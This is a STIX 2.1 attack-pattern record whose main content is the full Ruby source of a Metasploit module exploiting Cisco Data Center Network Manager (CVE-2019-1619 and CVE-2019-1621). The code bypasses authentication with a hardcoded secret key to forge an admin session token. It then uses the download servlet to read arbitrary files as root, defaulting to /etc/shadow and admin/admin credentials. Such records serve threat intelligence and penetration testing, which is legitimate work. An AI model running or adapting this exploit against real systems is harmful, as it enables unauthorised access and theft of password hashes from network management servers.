{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--02601808-cded-4d7d-b32b-d973566740ec",
    "created": "2024-08-14T16:24:16.732069Z",
    "modified": "2024-08-14T16:24:16.732073Z",
    "name": "Cisco Data Center Network Manager Unauthenticated File Download",
    "description": " DCNM exposes a servlet to download files on /fm/downloadServlet. An authenticated user can abuse this servlet to download arbitrary files as root by specifying the full path of the file. This module was tested on the DCNM Linux virtual appliance 10.4(2), 11.0(1) and 11.1(1), and should work on a few versions below 10.4(2). Only version 11.0(1) requires authentication to exploit (see References to understand why). ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/networking/cisco_dcnm_download.rb",
            "external_id": "cisco_dcnm_download.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-1619"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-1621"
        },
        {
            "source_name": "reference",
            "url": "https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190626-dcnm-bypass"
        },
        {
            "source_name": "reference",
            "url": "https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190626-dcnm-file-dwnld"
        },
        {
            "source_name": "reference",
            "url": "https://raw.githubusercontent.com/pedrib/PoC/master/advisories/Cisco/cisco-dcnm-rce.txt"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2019/Jul/7"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Deprecated\n  moved_from 'auxiliary/admin/cisco/cisco_dcnm_download'\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Cisco Data Center Network Manager Unauthenticated File Download',\n        'Description' => %q{\n          DCNM exposes a servlet to download files on /fm/downloadServlet.\n          An authenticated user can abuse this servlet to download arbitrary files as root by specifying\n          the full path of the file.\n          This module was tested on the DCNM Linux virtual appliance 10.4(2), 11.0(1) and 11.1(1), and should\n          work on a few versions below 10.4(2). Only version 11.0(1) requires authentication to exploit\n          (see References to understand why).\n        },\n        'Author' =>\n          [\n            'Pedro Ribeiro <pedrib[at]gmail.com>' # Vulnerability discovery and Metasploit module\n          ],\n        'License' => MSF_LICENSE,\n        'References' =>\n          [\n            [ 'CVE', '2019-1619' ],\n            [ 'CVE', '2019-1621' ],\n            [ 'URL', 'https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190626-dcnm-bypass' ],\n            [ 'URL', 'https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190626-dcnm-file-dwnld' ],\n            [ 'URL', 'https://raw.githubusercontent.com/pedrib/PoC/master/advisories/Cisco/cisco-dcnm-rce.txt' ],\n            [ 'URL', 'https://seclists.org/fulldisclosure/2019/Jul/7' ]\n          ],\n        'DisclosureDate' => '2019-06-26'\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(443),\n        OptBool.new('SSL', [true, 'Connect with TLS', true]),\n        OptString.new('TARGETURI', [true, 'Default server path', '/']),\n        OptString.new('USERNAME', [true, 'Username for auth (required only for 11.0(1)', 'admin']),\n        OptString.new('PASSWORD', [true, 'Password for auth (required only for 11.0(1)', 'admin']),\n        OptString.new('FILEPATH', [false, 'Path of the file to download', '/etc/shadow']),\n      ]\n    )\n  end\n\n  def auth_v11\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'fm/'),\n      'method' => 'GET',\n      'vars_get' =>\n      {\n        'userName' => datastore['USERNAME'],\n        'password' => datastore['PASSWORD']\n      }\n    )\n\n    if res && res.code == 200\n      # get the JSESSIONID cookie\n      if res.get_cookies\n        res.get_cookies.split(';').each do |cok|\n          if cok.include?('JSESSIONID')\n            return cok\n          end\n        end\n      end\n    end\n  end\n\n  def auth_v10\n    # step 1: get a JSESSIONID cookie and the server Date header\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'fm/'),\n      'method' => 'GET'\n    })\n\n    # step 2: convert the Date header and create the auth hash\n    if res && res.headers['Date']\n      jsession = res.get_cookies.split(';')[0]\n      date = Time.httpdate(res.headers['Date'])\n      server_date = date.strftime('%s').to_i * 1000\n      print_good(\"#{peer} - Got sysTime value #{server_date}\")\n\n      # auth hash format:\n      # username + sessionId + sysTime + POsVwv6VBInSOtYQd9r2pFRsSe1cEeVFQuTvDfN7nJ55Qw8fMm5ZGvjmIr87GEF\n      session_id = rand(1000..50000).to_s\n      md5 = Digest::MD5.digest 'admin' + session_id + server_date.to_s +\n                               'POsVwv6VBInSOtYQd9r2pFRsSe1cEeVFQuTvDfN7nJ55Qw8fMm5ZGvjmIr87GEF'\n      md5_str = Base64.strict_encode64(md5)\n\n      # step 3: authenticate our cookie as admin\n      # token format: sessionId.sysTime.md5_str.username\n      res = send_request_cgi(\n        'uri' => normalize_uri(target_uri.path, 'fm', 'pmreport'),\n        'cookie' => jsession,\n        'vars_get' =>\n        {\n          'token' => \"#{session_id}.#{server_date}.#{md5_str}.admin\"\n        },\n        'method' => 'GET'\n      )\n\n      if res && res.code == 500\n        return jsession\n      end\n    end\n  end\n\n  def run\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'fm', 'fmrest', 'about', 'version'),\n      'method' => 'GET'\n    )\n    noauth = false\n\n    if res && res.code == 200\n      if res.body.include?('version\":\"11.1(1)')\n        print_good(\"#{peer} - Detected DCNM 11.1(1)\")\n        print_status(\"#{peer} - No authentication required, ready to exploit!\")\n        noauth = true\n      elsif res.body.include?('version\":\"11.0(1)')\n        print_good(\"#{peer} - Detected DCNM 11.0(1)\")\n        print_status(\"#{peer} - Note that 11.0(1) requires valid authentication credentials to exploit\")\n        jsession = auth_v11\n      elsif res.body.include?('version\":\"10.4(2)')\n        print_good(\"#{peer} - Detected DCNM 10.4(2)\")\n        print_status(\"#{peer} - No authentication required, ready to exploit!\")\n        jsession = auth_v10\n      else\n        print_error(\"#{peer} - Failed to detect module version.\")\n        print_error('Please contact module author or add the target yourself and submit a PR to the Metasploit project!')\n        print_error(res.body)\n        print_error(\"#{peer} - Trying unauthenticated method for DCNM 10.4(2) and below...\")\n        jsession = auth_v10\n      end\n    end\n\n    if jsession || noauth\n      print_good(\"#{peer} - Successfully authenticated our JSESSIONID cookie\")\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Failed to authenticate JSESSIONID cookie\")\n    end\n\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'fm', 'downloadServlet'),\n      'method' => 'GET',\n      'cookie' => jsession,\n      'vars_get' => {\n        'showFile' => datastore['FILEPATH']\n      }\n    )\n\n    if res && res.code == 200 && !res.body.empty?\n      filedata = res.body\n      vprint_line(filedata.to_s)\n      fname = File.basename(datastore['FILEPATH'])\n\n      path = store_loot(\n        'cisco-DCNM.http',\n        'application/octet-stream',\n        datastore['RHOST'],\n        filedata,\n        fname\n      )\n      print_good(\"File saved in: #{path}\")\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Failed to download file #{datastore['FILEPATH']}\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2019-06-26"
}